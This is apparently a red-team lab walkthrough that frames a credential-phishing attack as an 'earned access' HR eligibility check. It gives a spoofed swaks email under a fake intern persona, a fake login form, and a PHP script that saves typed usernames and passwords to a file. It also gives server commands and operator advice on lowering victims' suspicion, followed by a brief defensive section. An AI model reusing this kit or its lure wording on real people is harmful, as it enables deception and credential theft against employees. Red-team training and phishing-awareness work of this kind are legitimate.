## **Law 40 — Despise the Free Lunch**

Interpretation (offensive context):  
Blatant “free” offers trigger suspicion. Position the interaction as **earned, limited, or process-bound** so it feels legitimate and worth the effort. Perceived cost → perceived value → higher trust.

---

# 🎯 Attack Scenario — _Earned-Access Portal (Non-Free Framing → Credential Capture)_

You avoid giveaways. Instead, you present access as something the user must **validate/qualify for**, which increases credibility and compliance.

**Persona:**

> _Ksenia Volkova_, 20 y/o HR Programs Intern

---

# 🔴 Red Team Objective

- Increase:
    
    - trust by **removing “free” signals**
        
- Drive:
    
    - credential entry as a **required step**
        
- Avoid:
    
    - giveaway-style lures (high suspicion)
        

---

# 🖥️ Lab Setup

### VMs:

- **Kali (Attacker/Host)** — 3GB
    
- **Ubuntu Victim** — 2GB
    

### Network:

- Host-only
    

---

# ⚙️ Operator Workflow

## Phase 1 — Value Framing (Not Free, Not Random)

### Email:

```bash
swaks --to target@corp.local \
--from ksenia.v@corp.local \
--server 192.168.56.101 \
--data "Subject: Eligibility confirmation

Hi,

You’ve been flagged for inclusion in the updated benefits cycle. Please confirm eligibility to proceed:

http://192.168.56.101:8080"
```

👉 Framing:

- not “free benefits”
    
- **eligibility check** (process-bound)
    

---

## Phase 2 — Portal (Process-Oriented UI)

On Kali:

```bash
mkdir eligibility && cd eligibility
```

```html
<h3>Eligibility Confirmation</h3>
<p>Please sign in to confirm your eligibility status.</p>
<form action="cap.php" method="POST">
  <input name="user" placeholder="Email">
  <input type="password" name="pass" placeholder="Password">
  <button>Confirm</button>
</form>
```

```php
<?php
file_put_contents("creds.txt", $_POST['user']." ".$_POST['pass']."\n", FILE_APPEND);
header("Location: /status.html");
?>
```

Optional status page:

```html
<h4>Status received. Processing your eligibility.</h4>
```

---

## Phase 3 — Hosting

```bash
php -S 0.0.0.0:8080
```

---

## Phase 4 — Execution

Target:

- perceives structured process
    
- believes access must be **validated, not granted**
    
- submits credentials
    

👉 No “free lunch” → lower suspicion

---

# 🛠️ Tooling + Commands

### Delivery:

```bash
swaks --to target@corp.local --from ksenia.v@corp.local
```

### Hosting:

```bash
php -S 0.0.0.0:8080
```

### Capture:

```php
file_put_contents("creds.txt", ...)
```

### Basic logging (optional):

```php
file_put_contents("hits.txt", $_SERVER['REMOTE_ADDR']."\n", FILE_APPEND);
```

---

# 🧠 Social Engineering Mapping (Hadnagy)

Relevant concepts:

- **Expectation management** (process over reward)
    
- **Perceived legitimacy via effort**
    
- **Reduction of “too good to be true” signals**
    

Key principle:

> If it feels earned, it feels real

---

# 🛡️ Detection & Defensive Insight

Indicators:

- “eligibility/validation” requests without prior announcement
    
- login gates tied to HR/benefits via **non-official links**
    
- neutral, process-like language masking intent
    

Mitigation:

- enforce:
    
    - HR workflows only via **known portals**
        
- comms:
    
    - official announcements precede any “eligibility” action
        
- user training:
    
    - “Process framing ≠ legitimacy—verify source”
        

---

# 📄 Report Artifact

### Title:

> Credential Harvest via Process-Based (Non-Free) Incentive Framing

### Include:

- email (eligibility framing)
    
- portal UI (process-oriented)
    
- captured credentials (lab)
    
- analysis:
    
    - why removing “free” increased trust
        
- impact:
    
    - higher compliance with lower suspicion
        

---

# ⚠️ Operator Insight

“Free” triggers doubt.  
“Earned/validated” triggers trust.

You don’t offer rewards—  
you **gate them behind a process**.

---

